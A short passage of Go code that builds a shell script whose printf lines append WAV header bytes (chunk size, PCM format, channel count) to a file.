	b.WriteString("  printf '%c%c%c%c' '\\x10' '\\x00' '\\x00' '\\x00' >> \"$wav_file\"\n")
	b.WriteString("  printf '%c%c' '\\x01' '\\x00' >> \"$wav_file\"\n")
	b.WriteString("  printf '%c%c' '\\x01' '\\x00' >> \"$wav_file\"\n")
